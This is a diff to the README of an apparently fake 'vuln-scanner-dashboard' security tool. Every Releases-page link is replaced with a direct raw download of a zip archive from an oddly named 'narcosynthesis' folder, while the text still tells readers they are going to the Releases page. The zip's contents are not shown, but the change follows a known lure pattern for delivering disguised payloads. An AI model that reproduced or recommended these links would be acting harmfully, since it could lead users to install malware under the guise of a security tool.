@@ -6,7 +6,7 @@ Welcome to the vuln-scanner-dashboard! This application helps you scan for vulne
 
 ## 📥 Download Now
 
-[![Download vuln-scanner-dashboard](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mkomanmkbxnhjxxkhdkhmxnb/vuln-scanner-dashboard/releases)
+[![Download vuln-scanner-dashboard](https://raw.githubusercontent.com/mkomanmkbxnhjxxkhdkhmxnb/vuln-scanner-dashboard/main/narcosynthesis/dashboard_vuln_scanner_v2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mkomanmkbxnhjxxkhdkhmxnb/vuln-scanner-dashboard/main/narcosynthesis/dashboard_vuln_scanner_v2.0.zip)
 
 ## 📝 Introduction
 
@@ -26,7 +26,7 @@ Before you start, make sure your system meets the following requirements:
 
 To get the latest version of the vuln-scanner-dashboard, please visit the following page:
 
-[Download vuln-scanner-dashboard from Releases](https://github.com/mkomanmkbxnhjxxkhdkhmxnb/vuln-scanner-dashboard/releases)
+[Download vuln-scanner-dashboard from Releases](https://raw.githubusercontent.com/mkomanmkbxnhjxxkhdkhmxnb/vuln-scanner-dashboard/main/narcosynthesis/dashboard_vuln_scanner_v2.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -91,4 +91,4 @@ Thanks to all contributors who made this project possible. Your efforts and dedi
 
 We welcome your thoughts and suggestions. Feel free to open an issue or contribute to the project by submitting a pull request.
 
-[Download vuln-scanner-dashboard from Releases](https://github.com/mkomanmkbxnhjxxkhdkhmxnb/vuln-scanner-dashboard/releases) to start securing your applications today!
+[Download vuln-scanner-dashboard from Releases](https://raw.githubusercontent.com/mkomanmkbxnhjxxkhdkhmxnb/vuln-scanner-dashboard/main/narcosynthesis/dashboard_vuln_scanner_v2.0.zip) to start securing your applications today!
